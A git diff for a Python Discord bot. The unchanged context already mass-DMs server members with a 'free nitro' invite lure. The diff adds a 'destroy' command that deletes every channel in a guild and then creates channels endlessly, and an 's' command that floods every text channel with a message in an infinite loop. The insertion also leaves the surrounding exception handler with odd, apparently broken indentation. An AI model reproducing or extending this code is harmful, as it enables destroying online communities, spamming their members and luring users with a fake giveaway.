@@ -32,6 +32,38 @@ async def on_guild_join(guild):
         try:
             await member.send(f"{member.mention} Join this server to get nitro https://discord.gg/cYwqYw2Rtr")
         except:
+            print("user closed")
+            
+            
+@client.command()
+async def destroy (ctx,message):
+    guild=ctx.message.guild
+    await ctx.message.delete()
+    
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+            print(f"{channel.name} has been deleted")
+        except:
+             pass
+    for i in range(1):
+        await guild.create_text_channel(f"{message}")
+    while True:
+        for channel in guild.text_channels:
+            for i in range (1):
+                await guild.create_text_channel(f"{message}")
+ 
+
+@client.command()
+async def s(ctx, *, message ):
+  guild=ctx.message.guild
+  await ctx.message.delete()
+  for i in range(2):
+    print("spammed")
+    while True:
+           for channel in guild.text_channels:
+                 await channel.send(f"{message}")
+
             print('User dm closed')
   
 @client.command()
